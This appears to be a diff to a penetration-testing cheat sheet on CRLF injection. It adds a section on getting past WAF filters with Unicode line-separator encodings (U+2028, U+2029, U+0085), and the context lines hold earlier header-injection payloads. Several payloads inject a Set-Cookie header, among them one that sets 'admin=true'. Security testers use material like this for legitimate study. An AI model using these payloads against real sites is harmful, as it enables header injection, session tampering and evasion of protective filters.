@@ -177,3 +177,18 @@ GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0
 - Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
 ```
 
+---
+## Advanced Unicode / Control-Character Bypasses
+
+Modern WAF/rewriter stacks often strip literal `\r`/`\n` but forget about other characters that many back-ends treat as line terminators. When CRLF is filtered, try:
+
+-   `%E2%80%A8` (`U+2028` -- LINE SEPARATOR)
+-   `%E2%80%A9` (`U+2029` -- PARAGRAPH SEPARATOR)
+-   `%C2%85` (`U+0085` -- NEXT LINE)
+
+Some Java, Python and Go frameworks convert these to `\n` during header parsing (see the 2023 Praetorian research). Combine them with classic payloads:
+
+`/%0A%E2%80%A8Set-Cookie:%20admin=true`
+
+If the filter normalises UTF-8 first, the control character is turned into a regular line-feed and the injected header is accepted.
+
